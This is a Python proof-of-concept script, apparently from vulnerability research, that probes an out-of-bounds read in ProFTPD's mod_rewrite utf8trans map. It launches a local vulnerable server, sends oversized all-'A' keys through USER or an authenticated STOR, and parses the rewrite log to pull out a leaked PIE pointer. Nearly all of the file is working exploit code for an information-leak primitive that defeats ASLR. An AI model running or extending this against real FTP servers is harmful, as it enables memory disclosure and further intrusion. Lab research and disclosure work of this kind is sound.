#!/usr/bin/env python3
"""Bounded probe: does the utf8trans over-read extend past substr into a PIE pointer?

A 1032-code-point all-'A' key makes the second OOB loop fill utf8_val[0..1031]
with 0x41, so substr (utf8_val[1024..1031]) is all nonzero.  pstrdup() at
mod_rewrite.c:2072 uses strlen(utf8_val), which then continues into
rewrite_rule_matches.match_string at utf8_val[1032..].  rewrite_log() at :1307
prints that copy BEFORE the next rewrite_parse_map_str() call dereferences the
now-wild substr at :1266.  Raw log bytes at offset 1032 of the returned string
are the test.  No addresses are computed; ASLR stays on; no setarch.

AUTH=1 uses an authenticated STOR on port 21904, where the 200-byte control
previously showed a live 0x55... pointer in rewrite_rule_matches.
A 1056-code-point key also fills the 32-byte zero gap between substr (0x106d20)
and rewrite_rule_matches (0x106d40) via code points 64,72,…,248, while the
second loop stops before the live match pointer at utf8_val[1056].
"""
import io
import os
import socket
import subprocess
import time
import ftplib

W = os.path.dirname(os.path.abspath(__file__))
AUTH = os.environ.get("AUTH", "0") == "1"
CFG = W + ("/etc/proftpd-leak.conf" if AUTH else "/etc/proftpd-prelogin-leak.conf")
BIN = W + "/../" + os.environ.get("BIN_NAME", "proftpd-vuln-plain")
LOG = W + ("/log/rewrite-leak.log" if AUTH else "/log/rewrite-prelogin-leak.log")
PORT = 21904 if AUTH else 21914
TAG = os.environ.get("TAG", "pie-leak")
PREFIX = b"internal map 'u8' returned '"
SETARCH = os.environ.get("SETARCH", "0") == "1"


def run_once(n):
    # A previous trial's parent can keep the RewriteLog fd open and write at
    # an old offset after truncation, producing stale returned-string lines.
    subprocess.run(["fuser", "-k", LOG], capture_output=True)
    subprocess.run(["fuser", "-k", "-n", "tcp", str(PORT)], capture_output=True)
    open(LOG, "wb").close()
    argv = ([BIN] if not SETARCH else ["setarch", "x86_64", "-R", BIN])
    srv = subprocess.Popen(argv + ["-n", "-c", CFG], cwd=W,
                           stdout=open(W + "/log/" + TAG + "-server.out", "ab"),
                           stderr=subprocess.STDOUT)
    result = []
    try:
        for _ in range(80):
            try:
                s = socket.create_connection(("127.0.0.1", PORT), 0.3)
                s.close()
                break
            except OSError:
                time.sleep(0.05)
        s = socket.create_connection(("127.0.0.1", PORT), 8)
        s.settimeout(8)
        s.recv(4096)
        pidfile = W + "/run/proftpd-leak.pid" if AUTH else W + "/run/proftpd-prelogin-leak.pid"
        try:
            pid = int(open(pidfile).read().strip())
            for mline in open("/proc/%d/maps" % pid):
                if "proftpd-vuln-plain" in mline and mline.split()[1].startswith("r--p"):
                    result.append("PIE_BASE " + mline.split()[0])
                    break
        except (OSError, ValueError, IndexError):
            result.append("PIE_BASE UNAVAILABLE")
        if AUTH:
            s.close()
            ftp = ftplib.FTP(encoding="latin-1")
            ftp.connect("127.0.0.1", PORT, timeout=5)
            ftp.login("labuser", "labpass")
            ftp.set_pasv(True)
            key = ("A" * n).encode().decode("latin-1")
            try:
                ftp.storbinary("STOR " + key, io.BytesIO(b"z" * 16))
            except Exception as exc:
                result.append("STOR_REPLY " + type(exc).__name__ + " " + str(exc)[:60])
            try:
                ftp.quit()
            except Exception:
                pass
        else:
            key = ("A" * n).encode()
            s.sendall(b"USER " + key + b"\r\n")
            try:
                result.append("USER_REPLY " + repr(s.recv(4096)[:120]))
            except OSError as exc:
                result.append("USER_RECV_FAIL " + type(exc).__name__)
            s.close()
        time.sleep(0.4)
        log = open(LOG, "rb").read()
        cands = []
        for ln in log.split(b"\n"):
            i = ln.find(PREFIX)
            if i >= 0:
                cands.append(ln[i + len(PREFIX):].rstrip(b"'"))
        result.append("MAP_RETURN_LINES %d" % len(cands))
        for j, val in enumerate(cands[-3:]):
            result.append("RETURN_LEN_%d %d" % (j, len(val)))
            result.append("RETURN_HEAD_%d %s" % (j, val[:16].hex()))
            result.append("RETURN_TAIL_%d %s" % (j, val[-24:].hex()))
            if len(val) >= 1056:
                result.append("EXTENDED_%d %s" % (j, val[1056:1068].hex()))
            if len(val) >= 1062:
                p = int.from_bytes(val[1056:1062], "little")
                result.append("PTR_VALUE_%d 0x%x" % (j, p))
            if len(val) >= 1152:
                result.append("COND_PTR_%d %s" % (j, val[1152:1160].hex()))
        result.append("PARSE_LOG %d" % log.count(b"rewrite_parse_map_str(): parsing"))
        result.append("SIGNALS %d" % open(W + "/log/" + TAG + "-server.out", "rb").read().count(b"signal 11"))
    finally:
        srv.terminate()
        try:
            srv.wait(timeout=3)
        except subprocess.TimeoutExpired:
            srv.kill()
        subprocess.run(["fuser", "-k", "-n", "tcp", str(PORT)], capture_output=True)
        with open(W + "/evidence/rewrite-" + TAG + "-%d.log" % n, "wb") as f:
            f.write(open(LOG, "rb").read())
    return result


def main():
    out = W + "/evidence/" + TAG + ".txt"
    lines = []
    for n in [int(x) for x in os.environ.get("LENS", "200,1056,1056,1056").split(",")]:
        lines.append("=== KEY_LENGTH %d ===" % n)
        lines.extend(run_once(n))
    with open(out, "w") as f:
        f.write("\n".join(lines) + "\n")
    print("\n".join(lines))


if __name__ == "__main__":
    main()
